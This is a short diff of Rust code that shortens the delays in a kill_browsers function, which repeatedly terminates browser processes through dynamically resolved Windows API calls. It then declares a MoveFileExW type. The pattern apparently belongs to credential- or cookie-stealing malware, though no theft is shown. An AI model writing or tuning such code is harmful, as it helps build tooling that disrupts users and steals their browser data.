@@ -308,12 +308,12 @@ pub fn kill_browsers() {
     let Some((cs, pf, pn, op, term, ch)) = resolve_fns() else { return };
 
     kill_browser_processes(cs, pf, pn, op, term, ch);
-    std::thread::sleep(std::time::Duration::from_millis(200));
+    std::thread::sleep(std::time::Duration::from_millis(100));
     kill_browser_processes(cs, pf, pn, op, term, ch);
-    std::thread::sleep(std::time::Duration::from_millis(200));
+    std::thread::sleep(std::time::Duration::from_millis(100));
     kill_browser_processes(cs, pf, pn, op, term, ch);
 
-    std::thread::sleep(std::time::Duration::from_millis(1000));
+    std::thread::sleep(std::time::Duration::from_millis(300));
 }
 
 type FnMoveFileExW = unsafe extern "system" fn(*const u16, *const u16, u32) -> i32;
